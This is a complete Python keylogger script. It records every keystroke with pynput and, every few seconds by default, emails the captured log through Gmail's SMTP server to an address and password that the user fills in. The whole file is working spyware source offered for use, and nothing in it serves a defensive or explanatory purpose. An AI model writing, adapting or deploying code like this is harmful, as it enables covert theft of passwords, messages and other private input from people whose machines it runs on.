#!/usr/bin/env python 

import pynput.keyboard , threading ,smtplib
class Keylogger :
    def __init__(self,time,email,password):
        self.log="Keylogger Started !"
        self.inter=time
        self.email=email
        self.passwd=password
    def send_email(self,email,password,report):
        serveur=smtplib.SMTP("smtp.gmail.com",587)
        serveur.starttls()
        serveur.login(email,password)
        serveur.sendmail(email,email,report)
        serveur.quit()

    def append (self,text):
        self.log=self.log+text

    def process_keys(self,key):
        try:
            current_key=str(key.char)
        except AttributeError :
            if str(key)== "Key.space" :
                current_key=" "
            else :
                current_key=" "+str(key)+" "
        self.append(current_key)        

    def report(self) :
        self.send_email(self.email,self.passwd,self.log)
        self.log=""
        timer=threading.Timer(self.inter,self.report)
        timer.start()

    def start(self):
        listener=pynput.keyboard.Listener(on_press=self.process_keys)
        with listener :
            self.report()
            listener.join()

my_keylogger=Keylogger(10,"YOUR EMAIL HERE","MAIL PASS") #Change HERE (first value is time interal to send reports)
my_keylogger.start()